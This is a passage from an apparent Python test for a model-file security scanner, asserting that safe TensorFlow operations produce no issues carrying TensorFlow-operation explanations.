    # Should not have explanations about TF operations (only other potential issues)
    tf_op_issues_with_explanations = [
        issue
        for issue in result.issues
        if issue.why and any(op in issue.why for op in ["TensorFlow", "operation", "graph"])
    ]
    assert len(tf_op_issues_with_explanations) == 0, "Safe operations should not have TF operation explanations"
